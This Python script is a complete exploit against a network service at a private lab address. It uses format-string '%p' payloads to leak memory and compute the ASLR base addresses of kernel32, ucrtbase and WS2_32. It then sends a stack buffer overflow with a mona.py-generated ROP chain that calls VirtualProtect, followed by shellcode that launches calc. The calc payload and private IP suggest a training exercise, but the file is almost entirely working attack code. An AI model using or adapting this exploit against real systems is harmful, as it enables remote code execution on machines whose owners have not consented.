#!/usr/bin/python
import socket
import struct

def getAslrBase():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    numberOfChars = 172
    char = b"%p>"
    buffer = char * numberOfChars
    fileName = 'leaked_adresses_2_3.txt'

    startLenght = 20
    bufferLenght = numberOfChars * 9 + startLenght

    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address
    s.recv(1024)
    s.send(bytes('C \r\n', 'utf-8'))
    s.recv(1024)
    s.send(buffer + bytes('\r\n', 'utf-8'))
    data = b""

    while(len(data)<bufferLenght):
        data += s.recv(bufferLenght)

    s.send(bytes('n\r\n', 'utf-8')) # evil buffer
    s.close()

    # remove unnecessary line which are send by the server
    string = data.decode("utf-8")
    string = string.replace("Neuer Topic: ", "")
    string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")
    string = string.replace(">", "\r\n")

    # write into the file
    f = open(fileName, "w")
    f.write(string)
    f.close()

    # open the file and put the leaked addresses in an array
    infile = open(fileName, 'r')
    lines = infile.readlines()
    leakedAdresses = []

    for line in lines:
        leakedAdresses.append(line)

    #calculation of ucrtbase base
    offSet_UcrtBase = int('CE76C', 16)
    leakedAdresseUcrtbase = leakedAdresses[27][0:8]
    leakedAdresseUcrtbase_int = int(leakedAdresseUcrtbase, 16)
    baseUcrtBase = hex(leakedAdresseUcrtbase_int - offSet_UcrtBase)


    #calculation of ws2_32 base
    offSet_WS2_32 = int('6C19', 16)
    leakedAdresseWS2_32 = leakedAdresses[0][0:8]
    leakedAdresseWS2_32_int = int(leakedAdresseWS2_32, 16)
    baseWS2_32 = hex(leakedAdresseWS2_32_int - offSet_WS2_32)

    # calculation of kernel32 base
    offSet_Kernel32 = int('4EF6C', 16)
    leakedAdresseKernel32_1 = leakedAdresses[157][0:8]
    leakedAdresseKernel32_2 = leakedAdresses[158][0:8]
    leakedAdresseKernel32_1_int = int(leakedAdresseKernel32_1, 16)
    leakedAdresseKernel32_2_int = int(leakedAdresseKernel32_2, 16)
    baseKernel32_1 = hex(leakedAdresseKernel32_1_int - offSet_Kernel32)
    baseKernel32_2 = hex(leakedAdresseKernel32_2_int - offSet_Kernel32)

    print(baseKernel32_1)
    print(baseKernel32_2)

    if len(baseKernel32_1) == 10:
        print('-------------------------------------')
        print('CALCULATED BASES FROM LEAKED ADRESSES')
        print('-------------------------------------')
        print('KERNEL32: ', baseKernel32_1)
        print('WS2_32: ', baseWS2_32)
        print('UcrtBase: ', baseUcrtBase)
        print('-------------------------------------')
        return baseUcrtBase, baseWS2_32, baseKernel32_1
    else:
        print('-------------------------------------')
        print('CALCULATED BASES FROM LEAKED ADRESSES')
        print('-------------------------------------')
        print('KERNEL32: ', baseKernel32_2)
        print('WS2_32: ', baseWS2_32)
        print('UcrtBase: ', baseUcrtBase)
        print('-------------------------------------')
        return baseUcrtBase, baseWS2_32, baseKernel32_2

def create_rop_chain(base_kernel32_dll, base_ucrtbase_DLL, base_WS2_32_dll):
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        # [---INFO:gadgets_to_set_esi:---]
        base_kernel32_dll + 0x000a7a4e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        base_kernel32_dll + 0x00001934,  # ptr to &VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR
        base_ucrtbase_DLL + 0x0003fbe2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_ucrtbase_DLL + 0x00028766,  # XCHG EAX,ESI # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ebp:---]
        base_ucrtbase_DLL + 0x00053639,  # POP EBP # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_ucrtbase_DLL + 0x0002e3a5,  # & push esp # ret  [ucrtbase.DLL] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ebx:---]
        base_ucrtbase_DLL + 0x00022024,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        0xfffffdff,  # Value to negate, will become 0x00000201
        base_ucrtbase_DLL + 0x000a0348,  # NEG EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_ucrtbase_DLL + 0x0000d236,  # XCHG EAX,EBX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_edx:---]
        base_ucrtbase_DLL + 0x0000ec33,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        0xffffffc0,  # Value to negate, will become 0x00000040
        base_ucrtbase_DLL + 0x00076b3d,  # NEG EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_kernel32_dll + 0x0009f97b,  # XCHG EAX,EDX # RETN 0x00 [kernel32.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ecx:---]
        base_ucrtbase_DLL + 0x000334e8,  # POP ECX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_WS2_32_dll + 0x00027328,  # &Writable location [WS2_32.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_edi:---]
        base_ucrtbase_DLL + 0x0003ddc1,  # POP EDI # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        base_ucrtbase_DLL + 0x000a034a,  # RETN (ROP NOP) [ucrtbase.DLL] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_eax:---]
        base_ucrtbase_DLL + 0x0009d7a5,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR
        0x90909090,  # nop
        # [---INFO:pushad:---]
        base_ucrtbase_DLL + 0x000c1224,  # PUSHAD # RETN [ucrtbase.DLL] ** REBASED ** ASLR
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    base_ucrtbase_DLL1, base_WS2_32_dll1, base_kernel32_dll1 = getAslrBase()

    base_kernel32_dll = int(base_kernel32_dll1, 16)
    base_ucrtbase_DLL = int(base_ucrtbase_DLL1, 16)
    base_WS2_32_dll = int(base_WS2_32_dll1, 16)

    rop_chain = create_rop_chain(base_kernel32_dll, base_ucrtbase_DLL, base_WS2_32_dll)

    a = b'\x41' * 36
    b = b'\x42' * 4
    c = rop_chain
    calculator = b'\x31\xd2\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7'

    buffer = a + b + c + calculator
    connect = s.connect(('10.0.2.12', 4444))  # hardcoded IP address
    s.recv(1024)
    s.send(bytes('C \r\n', 'utf-8'))
    s.recv(1024)
    s.send(buffer + bytes('\r\n', 'utf-8'))
    s.recv(1024)
    s.send(bytes('y\r\n', 'utf-8'))  # evil buffer
    s.close()

main()